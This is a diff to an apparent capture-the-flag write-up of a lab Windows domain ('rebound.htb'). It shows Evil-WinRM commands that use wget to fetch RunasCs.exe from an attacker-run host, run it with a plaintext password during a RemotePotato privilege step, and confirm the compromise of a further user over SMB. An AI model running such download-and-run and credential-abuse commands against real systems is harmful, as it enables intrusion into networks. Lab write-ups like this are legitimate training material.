@@ -354,7 +354,7 @@ After ingesting the new data into bloodhound i see that there is another user wi
 
 I can try something like remotepotato
 
-# RemotePotato
+# RemotePotato leads to user compromise
 ```python
 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> wget http://10.10.14.90:8000/RunasCs.exe -o run.exe
 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./run.exe winrm_svc 'Password123!' qwinsta -l 9
@@ -418,4 +418,5 @@ SMB         10.129.14.17    445    DC01             [+] rebound.htb\tbrady:543BO
 ```
 This user is now compromised
 
-
+![[Pasted image 20260404164158.png]]
+I have some enrollee rights but there is no 
